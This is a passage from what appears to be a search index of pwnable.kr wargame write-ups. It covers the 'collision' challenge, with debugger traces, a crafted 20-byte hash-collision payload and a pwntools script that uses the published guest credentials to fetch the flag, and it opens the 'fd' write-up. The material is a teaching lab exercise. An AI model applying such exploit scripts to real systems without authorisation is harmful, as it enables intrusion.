0x00007fffffffe070\u2502+0x0010: 0x0000000000000000 0x00007fffffffe078\u2502+0x0018: 0x00007fffffffe148 \u2192 0x00007fffffffe44f \u2192 \"/root/Desktop/pwnable.kr/collision/col\" 0x00007fffffffe080\u2502+0x0020: 0x0000000200040000 0x00007fffffffe088\u2502+0x0028: 0x00005555555551af \u2192 <main+0> push rbp 0x00007fffffffe090\u2502+0x0030: 0x0000000000000000 0x00007fffffffe098\u2502+0x0038: 0xf6e7f80b45a87e3d \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 code:x86:64 \u2500\u2500\u2500\u2500 0x5555555551ae <check_password+73> ret 0x5555555551af <main+0> push rbp 0x5555555551b0 <main+1> mov rbp, rsp \u2192 0x5555555551b3 <main+4> sub rsp, 0x10 0x5555555551b7 <main+8> mov DWORD PTR [rbp-0x4], edi 0x5555555551ba <main+11> mov QWORD PTR [rbp-0x10], rsi 0x5555555551be <main+15> cmp DWORD PTR [rbp-0x4], 0x1 0x5555555551c2 <main+19> jg 0x5555555551e6 <main+55> 0x5555555551c4 <main+21> mov rax, QWORD PTR [rbp-0x10] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 threads \u2500\u2500\u2500\u2500 [#0] Id 1, Name: \"col\", stopped, reason: BREAKPOINT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 trace \u2500\u2500\u2500\u2500 [#0] 0x5555555551b3 \u2192 main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 Then I set a breakpoint before the return instruction in check_password() and continued the execution : gef\u27a4 disas check_password Dump of assembler code for function check_password: 0x0000555555555165 <+0>: push rbp 0x0000555555555166 <+1>: mov rbp,rsp 0x0000555555555169 <+4>: mov QWORD PTR [rbp-0x18],rdi 0x000055555555516d <+8>: mov rax,QWORD PTR [rbp-0x18] 0x0000555555555171 <+12>: mov QWORD PTR [rbp-0x10],rax 0x0000555555555175 <+16>: mov DWORD PTR [rbp-0x8],0x0 0x000055555555517c <+23>: mov DWORD PTR [rbp-0x4],0x0 0x0000555555555183 <+30>: jmp 0x5555555551a2 <check_password+61> 0x0000555555555185 <+32>: mov eax,DWORD PTR [rbp-0x4] 0x0000555555555188 <+35>: cdqe 0x000055555555518a <+37>: lea rdx,[rax*4+0x0] 0x0000555555555192 <+45>: mov rax,QWORD PTR [rbp-0x10] 0x0000555555555196 <+49>: add rax,rdx 0x0000555555555199 <+52>: mov eax,DWORD PTR [rax] 0x000055555555519b <+54>: add DWORD PTR [rbp-0x8],eax 0x000055555555519e <+57>: add DWORD PTR [rbp-0x4],0x1 0x00005555555551a2 <+61>: cmp DWORD PTR [rbp-0x4],0x4 0x00005555555551a6 <+65>: jle 0x555555555185 <check_password+32> 0x00005555555551a8 <+67>: mov eax,DWORD PTR [rbp-0x8] 0x00005555555551ab <+70>: cdqe 0x00005555555551ad <+72>: pop rbp 0x00005555555551ae <+73>: ret End of assembler dump. gef\u27a4 break *0x00005555555551ae Breakpoint 2 at 0x5555555551ae gef\u27a4 c Continuing. Breakpoint 2, 0x00005555555551ae in check_password () [ Legend: Modified register | Code | Heap | Stack | String ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 registers \u2500\u2500\u2500\u2500 $rax : 0x46464645 $rbx : 0x0 $rcx : 0x6 $rdx : 0x10 $rsp : 0x00007fffffffe048 \u2192 0x0000555555555225 \u2192 <main+118> mov rdx, rax $rbp : 0x00007fffffffe060 \u2192 0x0000555555555260 \u2192 <__libc_csu_init+0> push r15 $rsi : 0x00007fffffffe148 \u2192 0x00007fffffffe44f \u2192 \"/root/Desktop/pwnable.kr/collision/col\" $rdi : 0x00007fffffffe476 \u2192 \"AAAAAAAAAAAAAAAAAAAA\" $rip : 0x00005555555551ae \u2192 <check_password+73> ret $r8 : 0x400 $r9 : 0x00007ffff7faad80 \u2192 0x0000000000000000 $r10 : 0xfffffffffffff479 $r11 : 0x00007ffff7e861e0 \u2192 <__strlen_sse2+0> pxor xmm0, xmm0 $r12 : 0x0000555555555080 \u2192 <_start+0> xor ebp, ebp $r13 : 0x00007fffffffe140 \u2192 0x0000000000000002 $r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 stack \u2500\u2500\u2500\u2500 0x00007fffffffe048\u2502+0x0000: 0x0000555555555225 \u2192 <main+118> mov rdx, rax \u2190 $rsp 0x00007fffffffe050\u2502+0x0008: 0x00007fffffffe148 \u2192 0x00007fffffffe44f \u2192 \"/root/Desktop/pwnable.kr/collision/col\" 0x00007fffffffe058\u2502+0x0010: 0x0000000200000000 0x00007fffffffe060\u2502+0x0018: 0x0000555555555260 \u2192 <__libc_csu_init+0> push r15 \u2190 $rbp 0x00007fffffffe068\u2502+0x0020: 0x00007ffff7e1209b \u2192 <__libc_start_main+235> mov edi, eax 0x00007fffffffe070\u2502+0x0028: 0x0000000000000000 0x00007fffffffe078\u2502+0x0030: 0x00007fffffffe148 \u2192 0x00007fffffffe44f \u2192 \"/root/Desktop/pwnable.kr/collision/col\" 0x00007fffffffe080\u2502+0x0038: 0x0000000200040000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 code:x86:64 \u2500\u2500\u2500\u2500 0x5555555551a1 <check_password+60> add DWORD PTR [rbx+0x7e04fc7d], eax 0x5555555551a7 <check_password+66> fisttp QWORD PTR [rbx-0x67b707bb] 0x5555555551ad <check_password+72> pop rbp \u2192 0x5555555551ae <check_password+73> ret \u21b3 0x555555555225 <main+118> mov rdx, rax 0x555555555228 <main+121> mov rax, QWORD PTR [rip+0x2e19] # 0x555555558048 <hashcode> 0x55555555522f <main+128> cmp rdx, rax 0x555555555232 <main+131> jne 0x55555555524c <main+157> 0x555555555234 <main+133> lea rdi, [rip+0xe08] # 0x555555556043 0x55555555523b <main+140> mov eax, 0x0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 threads \u2500\u2500\u2500\u2500 [#0] Id 1, Name: \"col\", stopped, reason: BREAKPOINT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 trace \u2500\u2500\u2500\u2500 [#0] 0x5555555551ae \u2192 check_password() [#1] 0x555555555225 \u2192 main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 The return value of check_password() is saved in EAX we need it to be 568134124 : gef\u27a4 print $eax $1 = 0x46464645 gef\u27a4 set $eax=568134124 Now if we continue execution it should attempt to execute /bin/cat flag : gef\u27a4 c Continuing. [Detaching after fork from child process 3166] /bin/cat: flag: No such file or directory [Inferior 1 (process 3101) exited normally] gef\u27a4 Great, now we need to find out how to make check_password() return that value, let\u2019s look at the code. check_password() : unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; } return res; } This function casts the given passcode ( p ) into integer, declares ip which is an array of pointers starting with the pointer to p , and declares an int variable called res and gives it a value of 0 then it loops 5 times through ip (because length of passcode is 20, 20/4 == 5 ) and adds each value to res , finally it returns res . In case you\u2019re confused, simply what happens is that it takes the given passcode which is 20 bytes length and divides it to 5 pieces (each piece 4 bytes) then it sums the decimal value of the 5 pieces and returns that value. For example the result of giving check_password() \u201cAAAAAAAAAAAAAAAAAAAA\u201d will be like this : \"AAAA\" + \"AAAA\" + \"AAAA\" + \"AAAA\" + \"AAAA\" 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 1094795585 + 1094795585 + 1094795585 + 1094795585 + 1094795585 res = 5473977925 To verify that I took the main code and added some printf statements, test code looks like this : #include <stdio.h> #include <string.h> unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; printf(\"\\n--------------------------\\n\"); printf(\"loop : %i\\n\", i); printf(\"piece value : %i\\n\",ip[i] ); printf(\"\\n\"); } return res; } int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } printf(\"hashcode : %i\\n\", hashcode); if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } Let\u2019s give it 20 A\u2019s : root@kali:~/Desktop/pwnable.kr/collision/test# ./test \"AAAAAAAAAAAAAAAAAAAA\" hashcode : 568134124 -------------------------- loop : 0 piece value : 1094795585 -------------------------- loop : 1 piece value : 1094795585 -------------------------- loop : 2 piece value : 1094795585 -------------------------- loop : 3 piece value : 1094795585 -------------------------- loop : 4 piece value : 1094795585 wrong passcode. You can see that the 5 pieces are of the same value which is the value of 0x41414141 (4 A\u2019s) : >>> 0x41414141 1094795585 And if we give it AAAABBBBCCCCDDDDEEEE : root@kali:~/Desktop/pwnable.kr/collision/test# ./test \"AAAABBBBCCCCDDDDEEEE\" hashcode : 568134124 -------------------------- loop : 0 piece value : 1094795585 -------------------------- loop : 1 piece value : 1111638594 -------------------------- loop : 2 piece value : 1128481603 -------------------------- loop : 3 piece value : 1145324612 -------------------------- loop : 4 piece value : 1162167621 wrong passcode. >>> 0x41414141 1094795585 >>> 0x42424242 1111638594 >>> 0x43434343 1128481603 >>> 0x44444444 1145324612 >>> 0x45454545 1162167621","title":"Code Analysis, Tests"},{"location":"Writeup/Binary%20Exploitation/collision/#exploitation","text":"We need to come up with 5 pieces that add up to 568134124. We can divide the original value by 5 : >>> 568134124/5 113626824 But 568134124 isn\u2019t divisible by 5 : >>> 568134124%5 4 We can use 113626824 as the first 4 pieces, to get the last piece we will multiply 113626824 by 4 and subtract the result from 568134124 : >>> 113626824 * 4 454507296 >>> 568134124 - 454507296 113626828 What\u2019s left is to convert them to hex : >>> hex(113626824) '0x6c5cec8' >>> hex(113626828) '0x6c5cecc' And because it\u2019s little endian we will reverse the order, final payload will be : python -c 'print \"\\xc8\\xce\\xc5\\x06\" * 4 + \"\\xcc\\xce\\xc5\\x06\"' Let\u2019s test it : root@kali:~/Desktop/pwnable.kr/collision/test# ./test `python -c 'print \"\\xc8\\xce\\xc5\\x06\" * 4 + \"\\xcc\\xce\\xc5\\x06\"'` ip : 1329747125 -------------------------- loop : 0 piece value : 113626824 -------------------------- loop : 1 piece value : 113626824 -------------------------- loop : 2 piece value : 113626824 -------------------------- loop : 3 piece value : 113626824 -------------------------- loop : 4 piece value : 113626828 /bin/cat: flag: No such file or directory It works. And by the way what we did now is a hash collision , we made a hash function produce the same output for different inputs. I also wrote small python script using pwntools : #!/usr/bin/python from pwn import * payload = p32(0x6c5cec8) * 4 + p32(0x6c5cecc) r = ssh('col' ,'pwnable.kr' ,password='guest', port=2222) p = r.process(executable='./col', argv=['col',payload]) flag = p.recv() log.success(\"Flag: \" + flag) p.close() r.close() pwned ! That\u2019s it , Feedback is appreciated ! Don\u2019t forget to read the other write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading.","title":"Exploitation"},{"location":"Writeup/Binary%20Exploitation/collision/#reference","text":"Writeup from https://0xrick.github.io/pwn/collision/","title":"Reference"},{"location":"Writeup/Binary%20Exploitation/fd/","text":"fd Category: Binary Exploitation Source: pwnable.kr Author: unknown Score: 5 Description Mommy! what is a file descriptor in Linux? try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw ssh fd@pwnable.kr -p2222 (pw:guest) Exploitation We see that there is a message where a kid asks him mom about file descriptor in Linux, pretty clear what fd stands for now here Also it has a command to connect to the challenge through SSH , so we connect through SSH We got connected successfully using the creds given from the challenge page , so we can see its a linux box , checking the contents of the home directory of fd user We can see three interesting file fd* * , fd.c* and flag* which is having the flag to the challenge. The fd is an ELF binary and *fd.c* is the C code on which the binary was created. So we move onto checking the C code We see that it first checked whether the user inputs two arguments including the filename at the beginning , if it doesn't then we get the message of passing an argument with the binary. Also we see that the variable *buf* is assigned 32 characters as buffer Then we see it has a variable *fd* which is assigned the value of atoi( argv[1] ) \u2014 0x1234 *atoi()* function converts ascii or string to integer And one more variable len* * which has value 0** After that we see that *len* value\u2019s changing to read(fd, buf, 32) Which puts the value of fd* * into the buf* * Then there is a string compare function( strcmp* *) checking whether the string is not equal to \u201c LETMEWIN\\n* *\u201d then it returns the message about learning Linux file I/O So what is this all about?? First let me tell you in short about file descriptors In Linux machine and C language , the Linux Descriptors have a value 0 for STDIN(Standard Input) , 1 for STDOUT(Standard Output) , 2 for STDERR(Standard Error) So if we look on man page of read() So we see that all it does is read from a file descriptor , so here if we can put 0 into fd , then we will be able to give an input to the program. First we try running the binary program We see without giving an argument , we get a message for passing an argument , so I just put a random number as an argument and see We get a message about learning linux file IO , so from the C code , we can see that all we had to do something is put a number which will get subtracted to 0x1234* * and make it a result of Zero.* * So we use python for this as its not that complicated We see the integer value for 0x1234* * is 4660* * , so we now pass this as an argument and see We can see that it got hung and most probably waiting for an input , so we now just pass the string which was there in the *strcmp()* function and see if we can get the flag We see that we get the message of good job followed by the flag , so we now copy and paste this on the challenge page to complete the challenge So here we paste the flag and click on Auth As I already pasted the flag before creating this writeup , so I got this message like above. Reference File descriptor: https://en.wikipedia.org/wiki/File_descriptor C library function - atoi(): https://www.tutorialspoint.com/c_standard_library/c_function_atoi.htm read(3) - Linux man page: https://linux.die.net/man/3/read Writeup from https://arkanoidctf.medium.com/pwnable-kr-writeup-fd-bf200047cfc2","title":"fd"},{"location":"Writeup/Binary%20Exploitation/fd/#fd","text":"Category: Binary Exploitation Source: pwnable.kr Author: unknown Score: 5","title":"fd"},{"location":"Writeup/Binary%20Exploitation/fd/#description","text":"Mommy! what is a file descriptor in Linux? try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw ssh fd@pwnable.kr -p2222 (pw:guest)","title":"Description"},{"location":"Writeup/Binary%20Exploitation/fd/#exploitation","text":"We see that there is a message where a kid asks him mom about file descriptor in Linux, pretty clear what fd stands for now here Also it has a command to connect to the challenge through SSH , so we connect through SSH We got connected successfully using the creds given from the challenge page , so we can see its a linux box , checking the contents of the home directory of fd user We can see three interesting file fd* * , fd.c* and flag* which is having the flag to the challenge. The fd is an ELF binary and *fd.c* is the C code on which the binary was created. So we move onto checking the C code We see that it first checked whether the user inputs two 